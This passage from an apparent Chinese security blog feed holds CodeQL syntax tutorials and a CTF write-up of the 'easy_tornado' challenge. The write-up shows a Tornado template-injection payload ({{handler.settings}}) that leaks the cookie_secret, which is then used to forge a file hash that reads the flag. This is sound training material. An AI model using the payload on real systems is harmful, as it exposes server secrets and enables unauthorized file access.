class="hljs-built_in">boolean</span>;<br></code></pre></td></tr></table></figure><p>或者，要使⽤在 <code>OneTwoThreeLib.ql</code>l 中的模块 <code>M</code> 中定义的 <code>OneTwo</code> 类，您可以创建⼀个别名来使⽤较短的名称 <code>OT</code> ：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs axapta">import OneTwoThreeLib<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OT</span> = M::OneTwo;<br><br>...<br><br><span class="hljs-keyword">from</span> OT ot<br><span class="hljs-keyword">select</span> ot<br></code></pre></td></tr></table></figure><h3 id="谓词别名（Predicate-aliases）"><a href="#谓词别名（Predicate-aliases）" class="headerlink" title="谓词别名（Predicate aliases）"></a>谓词别名（Predicate aliases）</h3><p>使⽤以下语法为⾮成员谓词定义别名：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">predicate PredAlias <span class="hljs-operator">=</span> PredicateName/Arity<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这适⽤于有结果或⽆结果的谓词。</p><p>例如，假设您经常使⽤以下谓词，该谓词计算⼩于10的正整数的后继：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> get<span class="hljs-constructor">Successor(<span class="hljs-params">int</span> <span class="hljs-params">i</span>)</span>&#123;<br>    result = i + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">and</span> <br>    i <span class="hljs-keyword">in</span> <span class="hljs-literal">[<span class="hljs-number">1</span> .. <span class="hljs-number">9</span>]</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以使⽤别名将名称缩写为 <code>succ</code> ：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">predicate succ <span class="hljs-operator">=</span> getSuccessor/<span class="hljs-number">1</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>作为没有结果的谓词的示例，假设拥有⼀个谓词，该谓词可容纳<code>⼩于10</code>的任何正整数：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">predicate isSmall(int <span class="hljs-selector-tag">i</span>)&#123;<br>    <span class="hljs-selector-tag">i</span> in <span class="hljs-selector-attr">[1 .. 9]</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以给谓词⼀个更具描述性的名称，如下所示：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>codeql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 护网杯2018-Easy-tornado</title>
    <link href="/2022/11/28/%5Bctf-web%5D%20%E6%8A%A4%E7%BD%91%E6%9D%AF2018-Easy-tornado/"/>
    <url>/2022/11/28/%5Bctf-web%5D%20%E6%8A%A4%E7%BD%91%E6%9D%AF2018-Easy-tornado/</url>
    
    <content type="html"><![CDATA[<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>进入是一个页面，又三个连接，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221128192531248.png" alt="image-20221128192531248"></p><p>第一个是：<code>http://b46f7ad5-5839-4749-9911-87c82d95bbca.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=941047e17075b168f6ba776493615621</code></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221128192606274.png" alt="image-20221128192606274"></p><p>第二个是：<code>http://b46f7ad5-5839-4749-9911-87c82d95bbca.node4.buuoj.cn:81/file?filename=/welcome.txt&amp;filehash=b87e72eeee867cab3d21df26d71f017e</code></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221128192625396.png" alt="image-20221128192625396"></p><p>第三个是：<code>http://b46f7ad5-5839-4749-9911-87c82d95bbca.node4.buuoj.cn:81/file?filename=/hints.txt&amp;filehash=fc9e6c69d704d53bf203ec9a2d86d014</code></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221128192645387.png" alt="image-20221128192645387"></p><p>访问<code>http://b46f7ad5-5839-4749-9911-87c82d95bbca.node4.buuoj.cn:81/file?filename=/fllllllllllllag&amp;filehash=</code>后，会跳转到<code>http://b46f7ad5-5839-4749-9911-87c82d95bbca.node4.buuoj.cn:81/error?msg=Error</code>，且显示<code>Error</code>。</p><p>看来需要得到<code>cookie_secret</code>，但是抓包后发现没有这个。后来发现了有个<code>tornado</code>框架，其中有模板注入漏洞，使用<code>&#123;&#123;handler.settings&#125;&#125;</code>可以查看<code>RequestHandler.application.settings</code>。</p><p>访问<code>http://b46f7ad5-5839-4749-9911-87c82d95bbca.node4.buuoj.cn:81/error?msg=&#123;&#123;1&#125;&#125;</code>，页面会显示<code>1</code>，然后访问<code>http://b46f7ad5-5839-4749-9911-87c82d95bbca.node4.buuoj.cn:81/error?msg=&#123;&#123;handler.settings&#125;&#125;</code>，可以得到响应了，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221128193554018.png" alt="image-20221128193554018"></p><p>这样就可以构造hash了。</p><p>需要注意的是文件求<code>md5</code>时是<code>/fllllllllllllag</code>，而且注意<code>md5</code>的求法，不同网站可能结果不同，推荐<a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[代码审计] codeql语法-04-表达式</title>
    <link href="/2022/11/27/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-04-%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2022/11/27/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-04-%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="codeql语法–表达式（Expressions）"><a href="#codeql语法–表达式（Expressions）" class="headerlink" title="codeql语法–表达式（Expressions）"></a>codeql语法–表达式（Expressions）</h1><p>表达式的计算结果为⼀组值并具有⼀个类型。<br>例如，表达式 1+2 计算结果为整数3，表达式”QL” 的计算结果为字符串类型输出”QL” ,1 + 2 这个表达式的类型为int，⽽”QL”的表达式类型为string</p><h2 id="括号表达式（Parenthesized-expressions）"><a href="#括号表达式（Parenthesized-expressions）" class="headerlink" title="括号表达式（Parenthesized expressions）"></a>括号表达式（Parenthesized expressions）</h2><p>带括号的表达式是⽤括号 ( 和括起来的表达式 ) 。此表达式的类型和值与原始表达式完全相同。括号可⽤于将表达式分组在⼀起以消除歧义并提⾼可读性。</p><h2 id="范围表达式-Ranges"><a href="#范围表达式-Ranges" class="headerlink" title="范围表达式(Ranges)"></a>范围表达式(Ranges)</h2><p>范围表达式表示在两个表达式之间排序的值的范围。它由<code>..</code>将两个表达式分隔， 并⽤⽅括号（ <code>[</code> 和 <code>]</code> ）括起来。例如，是有效的范围表达式。它的值是和之间（包括和本身）之间的任何整数 。 <code>[3 .. 7]</code> 表示3和7内所有的整数在有效范围内，开始和结束表达式是整数，浮点数或⽇期。如果其中之⼀是⽇期，则两个都必须是⽇期。如果其中⼀个是整数，另⼀个是浮点数，则两者都将被视为浮点数。</p><h2 id="常量范围表达式-Set-literal-expressions"><a href="#常量范围表达式-Set-literal-expressions" class="headerlink" title="常量范围表达式(Set literal expressions)"></a>常量范围表达式(Set literal expressions)</h2><p>可以设置⼀个常量范围表达式，例如： <code>[2, 3, 5, 7, 11, 13, 17, 19, 23, 29]</code> 它表示30以内的质数。</p><h2 id="超级表达式（Super-expressions）"><a href="#超级表达式（Super-expressions）" class="headerlink" title="超级表达式（Super expressions）"></a>超级表达式（Super expressions）</h2><p>QL中的超级表达式类似于其他编程语⾔（例如Java）中的超级表达式。当您要使⽤超类型的谓词定义时，可以在谓词调⽤中使⽤它们。实际上，当谓词从其超类型继承两个定义时，这很有⽤。在这种情况下，谓词必须覆盖 这些定义以避免歧义。但是，如果要使⽤特定超类型的定义⽽不是编写新定义，则可以使⽤超级表达式。</p><p>在下⾯的示例中，该类 <code>C</code> 继承了谓词的两个定义 <code>getANumber()</code> - ⼀个来⾃<code>A</code> 和⼀个来⾃ <code>B</code> 。它使⽤中的定义 B，不是覆盖两个定义，</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">int</span></span>&#123;<br>    <span class="hljs-type">A</span>()&#123;<span class="hljs-keyword">this</span>=<span class="hljs-number">1</span>&#125;<br>    int getANumber()&#123;result=<span class="hljs-number">2</span>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">int</span></span>&#123;<br>    <span class="hljs-type">B</span>()&#123;<span class="hljs-keyword">this</span>=<span class="hljs-number">1</span>&#125;<br>    int getANumber()&#123;result=<span class="hljs-number">3</span>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span>,<span class="hljs-title">B</span></span>&#123;<br>    int getANumber()&#123;<br>        result = <span class="hljs-type">B</span>.<span class="hljs-keyword">super</span>.getANumber()<br>    &#125;<br>&#125;<br><br>from <span class="hljs-type">C</span> c<br>select c, c.getANumber()<br></code></pre></td></tr></table></figure><p>输出结果为<code>1,3</code></p><h2 id="聚合（Aggregations）"><a href="#聚合（Aggregations）" class="headerlink" title="聚合（Aggregations）"></a>聚合（Aggregations）</h2><p>聚合是⼀种映射，它根据公式指定的⼀组输⼊值来计算结果值。<br>通⽤语法为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">aggregate</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">variable</span> <span class="hljs-attr">declarations</span>&gt;</span> | <span class="hljs-tag">&lt;<span class="hljs-name">formula</span>&gt;</span> | <span class="hljs-tag">&lt;<span class="hljs-name">expression</span>&gt;</span>)<br></code></pre></td></tr></table></figure><h3 id="count"><a href="#count" class="headerlink" title="count"></a>count</h3><p>定汇总变量每个可能分配的的不同值的数量。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">count(<span class="hljs-keyword">File</span> f | <span class="hljs-type">f</span>.getTotalNumberOfLines() &gt; <span class="hljs-number">500</span> | <span class="hljs-type">f</span>)<br></code></pre></td></tr></table></figure><p>合返回的⽂件数多于 500⾏数。</p><p>如果没有满⾜公式的聚合变量的可能赋值，例如 ，则默认为value 。 <code>count(int i | i = 1 and i= 2 | i)</code> ，结果是 0</p><h3 id="min和max"><a href="#min和max" class="headerlink" title="min和max"></a>min和max</h3><p>确定聚合变量可能分配中的最⼩（min）或最⼤（max）值。在这种情况下，必须为数字类型或类型string。</p><p>聚合返回 <code>.js</code> ⾏数最多的⼀个或多个⽂件的名称：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-meta">max</span>(<span class="hljs-keyword">File</span> f | f.getExtensio<span class="hljs-meta">n</span>() = <span class="hljs-string">&quot;js&quot;</span> | f.getBaseName() <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> f.getTotalNumberOfLines())<br></code></pre></td></tr></table></figure><p>以下汇总返回 s 下⾯提到的三个字符串中的最⼩字符串，即，按的所有可能值的字典顺序排列的第⼀个字<br>符串 s 。在这种情况下，它返回 “De Morgan”</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">min</span><span class="hljs-params">(string s | s = <span class="hljs-string">&quot;Tarski&quot;</span> or s = <span class="hljs-string">&quot;Dedekind&quot;</span> or s = <span class="hljs-string">&quot;De Morgan&quot;</span> |s)</span></span><br></code></pre></td></tr></table></figure><h3 id="avg"><a href="#avg" class="headerlink" title="avg"></a>avg</h3><p>确定 <code>&lt;expression&gt;</code> 汇总变量所有可能分配的平均值。<code>&lt;expression&gt;</code> 必须为数字。如果没有满⾜公式的聚合变量的可能赋值，则聚合将失败并且不返回任何值。</p><p>下⾯的聚合返回平均整数的 0 ， 1 ， 2 ，和 3 ：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">avg</span><span class="hljs-params">(int i | i = [<span class="hljs-number">0</span> .. <span class="hljs-number">3</span>] | i)</span></span><br></code></pre></td></tr></table></figure><h3 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h3><p>确定 <code>&lt;expression&gt;</code> 汇总变量所有可能分配的值之和。<code>&lt;expression&gt;</code> 必须为数字。如果没有满⾜公式的聚合变量的可能赋值，则总和为 0 。</p><p>以下聚合返回和的所有可能值的和： <code>i * j</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">sum</span>(<span class="hljs-built_in">int</span> i, <span class="hljs-built_in">int</span> j | i = [<span class="hljs-number">0</span> .. <span class="hljs-number">2</span>] and j = [<span class="hljs-number">3</span> .. <span class="hljs-number">5</span>] | i * j)<br></code></pre></td></tr></table></figure><h3 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h3><p>将 <code>&lt;expression&gt;</code> 所有可能赋值的值连接到聚合变量。该<code>&lt;expression&gt;</code> 类型必须为 string 。如果没有满⾜公式的聚合变量的可能赋值，则 concat 默认为空字符串。</p><p>下⾯的聚合返回字符串 “3210” </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">concat(<span class="hljs-type">int</span> i | i = [<span class="hljs-number">0</span> .. <span class="hljs-number">3</span>] | i.toString() <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> i <span class="hljs-keyword">desc</span>)<br></code></pre></td></tr></table></figure><p><code>concat</code> 聚集体还可以采取的第⼆表达，从⽤逗号的第⼀个分离。将第⼆个表达式作为分隔符插⼊每个串联值之间。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">concat(<span class="hljs-name">int</span> i | i = [0 .. 3] | i.toString(), <span class="hljs-string">&quot;|&quot;</span>)<br></code></pre></td></tr></table></figure><p>聚合返回 “0|1|2|3” </p><h3 id="rank"><a href="#rank" class="headerlink" title="rank"></a>rank</h3><p>对<code>&lt;expression&gt;</code>排序。<code>&lt;expression&gt;</code>必须为数字类型或类型 string 。聚合返回在rank表达式指定的位置中排名的值。您必须在关键字后⾯的⽅括号中包括该等级表达式 rank 。</p><p>以下聚合返回在所有可能值中排名第四的值</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">rank[<span class="hljs-number">4</span>](int i | <span class="hljs-type">i</span> = [<span class="hljs-number">5</span> .. <span class="hljs-number">15</span>] | <span class="hljs-type">i</span><br></code></pre></td></tr></table></figure><p>请注意，排名索引从开始 1 ，因此不 rank<a href="...">0</a> 返回任何结果。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><code>strictconcat</code> ， <code>strictcount</code> 和 <code>strictsum</code> ：这些聚集的⼯作⼀样 <code>concat</code> ， <code>count</code> 和<code>sum</code> 分别，除了他们是<strong>严格的</strong>。也就是说，如果没有满⾜公式的聚合变量的可能赋值，则整个聚合将失败并计算为空集（⽽不是默认为 0 或空字符串）。如果您只对聚合主体不重要的结果感兴趣，这将很有⽤。</p><p><code>unique</code> ：此聚合取决于 <code>&lt;expression&gt;</code> 聚合变量的所有可能分配的值。如果 <code>&lt;expression&gt;</code> 在聚合变量中有⼀个唯⼀的值，则聚合将求值到该值。否则，合计没有价值。</p><h2 id="如何检查评估聚合（Evaluation-of-aggregates）"><a href="#如何检查评估聚合（Evaluation-of-aggregates）" class="headerlink" title="如何检查评估聚合（Evaluation of aggregates）"></a>如何检查评估聚合（Evaluation of aggregates）</h2><p>总的来说，综合评估涉及以下步骤：</p><ol><li>确定输⼊变量：这些是在聚合中声明的聚合变量，以及在聚合的某些组件中使⽤的在聚合外部声明的变量。 <code>&lt;variable declarations&gt;</code></li><li>⽣成输⼊变量的值的所有可能的不同元组（组合），使 <code>&lt;formula&gt;</code> 成⽴。请注意，聚合变量的相同值可能会出现在多个不同的元组中。处理元组时，具有相同值的所有此类出现均被视为不同的出现。</li><li><code>&lt;expression&gt;</code> 在每个元组上应⽤并收集⽣成的（不同的）值。 <expression> 在元组上应⽤可能会导致⽣成多个值。</li><li>将聚合函数应⽤于步骤3中⽣成的值以计算最终结果。</li></ol><p>将这些步骤应⽤于 <code>sum</code> 以下查询中的汇总：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">select sum(<span class="hljs-built_in">int</span> i, <span class="hljs-built_in">int</span> j <span class="hljs-pattern-match">| exists(<span class="hljs-built_in">string</span> s | s = &quot;hello&quot;.<span class="hljs-built_in">char</span><span class="hljs-constructor">At(<span class="hljs-params">i</span>)</span>) <span class="hljs-keyword">and</span> exists(<span class="hljs-built_in">string</span> s | s = &quot;world!&quot;.<span class="hljs-built_in">char</span><span class="hljs-constructor">At(<span class="hljs-params">j</span>)</span>) | i)</span><br></code></pre></td></tr></table></figure><ul><li>输⼊变量i.j</li><li>满⾜给定条件的所有可能元组：（<code>&lt;value of i&gt;&lt;value of j&gt;</code>) (0, 0), (0, 1), (0, 2), (0,3), (0, 4), (0, 5), (1, 0), (1, 1), …, (4, 5) .在此步骤中将⽣成30个元组</li><li>将<code>&lt;expression&gt;</code>应⽤在所有元组的值中，这意味着筛选出所有符合条件i和j的值0, 0, 0, 0, 0, 0, 1, 1,1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 3, 3, 4, 4, 4, 4,4, 4</li><li>将使⽤sum公式聚合搜索出来的值，总额为60</li></ul><p>如果我们改变表达式为<code>i+j</code>，这个查询的结果将是135，<code>i+j</code> 在所有的元组内的值是：0, 1, 2, 3, 4, 5, 1, 2,<br>3, 4, 5, 6, 2, 3, 4, 5, 6, 7, 3, 4, 5, 6, 7, 8, 4, 5, 6, 7, 8, 9</p><h2 id="省略聚合的⼀部分（Omitting-parts-of-an-aggregation）"><a href="#省略聚合的⼀部分（Omitting-parts-of-an-aggregation）" class="headerlink" title="省略聚合的⼀部分（Omitting parts of an aggregation）"></a>省略聚合的⼀部分（Omitting parts of an aggregation）</h2><p>聚合的三个部分并不总是必需的，因此您通常可以以更简单的形式编写聚合。</p><p>如果要编写形式的集合，则可以省略和部分，并按如下⽅式编写：<code>&lt;aggregate&gt;(&lt;type&gt; v |&lt;expression&gt; = v | v)&lt;variable declarations&gt;&lt;formula&gt;</code></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">count</span>(int i | i = <span class="hljs-string">&quot;hello&quot;</span>.<span class="hljs-built_in">indexOf</span>(<span class="hljs-string">&quot;l&quot;</span>) | i)<br>ount(<span class="hljs-string">&quot;hello&quot;</span>.<span class="hljs-built_in">indexOf</span>(<span class="hljs-string">&quot;l&quot;</span>))<br></code></pre></td></tr></table></figure><p>如果只有⼀个聚合变量，则可以省略该 <code>&lt;expression&gt;</code> 部分。在这种情况下，表达式被视为聚合变量本身。例如，以下聚合是等效的：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">avg</span><span class="hljs-params">(int i | i = [<span class="hljs-number">0</span> .. <span class="hljs-number">3</span>] | i)</span></span><br><span class="hljs-function"><span class="hljs-title">avg</span><span class="hljs-params">(int i | i = [<span class="hljs-number">0</span> .. <span class="hljs-number">3</span>])</span></span><br></code></pre></td></tr></table></figure><p>作为⼀种特殊情况，即使存在多个聚集变量，也可以省略count的 <code>&lt;expression&gt;</code> 部分。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">count</span>(<span class="hljs-built_in">int</span> i, <span class="hljs-built_in">int</span> j | i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span> .. <span class="hljs-number">3</span>] and j <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span> .. <span class="hljs-number">3</span>] | <span class="hljs-number">1</span>)<br><span class="hljs-keyword">count</span>(<span class="hljs-built_in">int</span> i, <span class="hljs-built_in">int</span> j | i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span> .. <span class="hljs-number">3</span>] and j <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span> .. <span class="hljs-number">3</span>])<br></code></pre></td></tr></table></figure><p>可以省略 <code>&lt;formula&gt;</code> 部分。</p><p>也可以同时省略 <code>&lt;formula&gt;</code> 和 <code>&lt;expression&gt;</code> 部分。</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-built_in">count</span>(<span class="hljs-keyword">File</span> f | <span class="hljs-built_in">any</span>() | <span class="hljs-number">1</span>)<br><span class="hljs-built_in">count</span>(<span class="hljs-keyword">File</span> f | | <span class="hljs-number">1</span>)<br><span class="hljs-built_in">count</span>(<span class="hljs-keyword">File</span> f)<br></code></pre></td></tr></table></figure><h2 id="递归单调聚合（Recursive-monotonic-aggregates）"><a href="#递归单调聚合（Recursive-monotonic-aggregates）" class="headerlink" title="递归单调聚合（Recursive monotonic aggregates）"></a>递归单调聚合（Recursive monotonic aggregates）</h2><p>可以递归使⽤单调聚合，但是递归调⽤只能出现在表达式中，⽽不能出现在范围内。聚合的递归语义与其余QL的递归语义相同。例如，我们可以定义⼀个谓词来计算图中⼀个节点到叶⼦的距离，如下所示：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">int depth(<span class="hljs-keyword">Node</span> <span class="hljs-title">n</span>) &#123;<br>    if not exists(n.getAChild())<br>    then result = <span class="hljs-number">0</span><br>    else result = <span class="hljs-number">1</span> + max(<span class="hljs-keyword">Node</span> <span class="hljs-title">child</span> | child = n.getAChild() | depth(child))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Any表达式（Any）"><a href="#Any表达式（Any）" class="headerlink" title="Any表达式（Any）"></a>Any表达式（Any）</h2><p><code>any</code> 表达式的⼀般语法类似于聚合的语法 ，即：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-literal">any</span>(<span class="hljs-variable">&lt;variable declarations&gt;</span> | <span class="hljs-variable">&lt;formula&gt;</span> | <span class="hljs-variable">&lt;expression&gt;</span>)<br></code></pre></td></tr></table></figure><p>该 any 表达式表示具有特定形式并满⾜特定条件的任何值。更准确地说， <code>any</code> 表达式是：</p><ol><li>介绍临时变量。</li><li>将其值限制为满⾜该 <code>&lt;formula&gt;</code> 部分的值（如果存在）。</li><li><code>&lt;expression&gt;</code> 为每个变量返回。如果没有任何 <code>&lt;expression&gt;</code> 部分，那么它将返回变量本身。</li></ol><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221127200937406.png" alt="image-20221127200937406"></p><h2 id="⼀元运算（Unary-operations）"><a href="#⼀元运算（Unary-operations）" class="headerlink" title="⼀元运算（Unary operations）"></a>⼀元运算（Unary operations）</h2><p>⼀元运算是减号（ - ）或加号（ + ），后跟类型 int 或的表达式 float 。例如：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">-<span class="hljs-number">6.28</span><br>+(<span class="hljs-number">10</span> - <span class="hljs-number">4</span>)<br>+<span class="hljs-built_in">avg</span>(float f | f = <span class="hljs-number">3.4</span> or f = -<span class="hljs-number">9.8</span>)<br><span class="hljs-built_in">-sum</span>(int i | i in [<span class="hljs-number">0</span> .. <span class="hljs-number">9</span>] | i * i)<br></code></pre></td></tr></table></figure><p>加号使表达式的值保持不变，⽽减号使值的算术求反。</p><h2 id="⼆元运算（Binary-operations）"><a href="#⼆元运算（Binary-operations）" class="headerlink" title="⼆元运算（Binary operations）"></a>⼆元运算（Binary operations）</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-number">5</span> <span class="hljs-comment">% 2</span><br>(<span class="hljs-number">9</span> + <span class="hljs-number">1</span>) / (<span class="hljs-number">-2</span>)<br><span class="hljs-string">&quot;Q&quot;</span> + <span class="hljs-string">&quot;L&quot;</span><br><span class="hljs-number">2</span> * <span class="hljs-built_in">min</span>(float f | f in [<span class="hljs-number">-3</span> .. <span class="hljs-number">3</span>]) <br></code></pre></td></tr></table></figure><p>如果两个表达式都是数字，则这些运算符将充当标准算术运算符。例如:10.6 - 3.2 结果值为7.4，123.456 * 0 值为0，9%4 值为1（取余数）。如果两个操作数均为整数，则结果为整数。否则，结果为浮点数。</p><p>还可以将其 + ⽤作字符串连接运算符。在这种情况下，⾄少⼀个表达式必须是字符串，⽽另⼀个表达式将使⽤ toString() 谓词隐式转换为字符串 。这两个表达式是连接在⼀起的，结果是⼀个字符串。例如，表达式具有value 。 221 + “B” 的结果为 “221B”</p><h2 id="强制转换（Casts）"><a href="#强制转换（Casts）" class="headerlink" title="强制转换（Casts）"></a>强制转换（Casts）</h2><p>强制转换可让您限制表达式的类型。这类似于使⽤其他语⾔（例如Java）进⾏转换。</p><p>两种方式：</p><ul><li>作为“后缀”强制转换：在圆括号后加点号和类型名称。例如， <code>x.(Foo)</code> 将类型限制 x 为 Foo 。</li><li>作为“前缀”强制转换：括号中的类型，后跟另⼀个表达式。例如， <code>(Foo)x</code> 还将的类型限制 x 为Foo 。</li></ul><p>请注意，后缀强制转换等同于⽤括号括起来的前缀强制转换- <code>x.(Foo)</code> 完全等同于 <code>((Foo)x)</code> 。</p><h2 id="“不在乎”表达式-Don’t-care-expressions"><a href="#“不在乎”表达式-Don’t-care-expressions" class="headerlink" title="“不在乎”表达式(Don’t-care expressions)"></a>“不在乎”表达式(Don’t-care expressions)</h2><p>这是写为单个下划线的表达式 <code>_</code> 。它代表任何值。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>codeql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[代码审计] codeql语法-03-变量</title>
    <link href="/2022/11/27/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-03-%E5%8F%98%E9%87%8F/"/>
    <url>/2022/11/27/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-03-%E5%8F%98%E9%87%8F/</url>
    
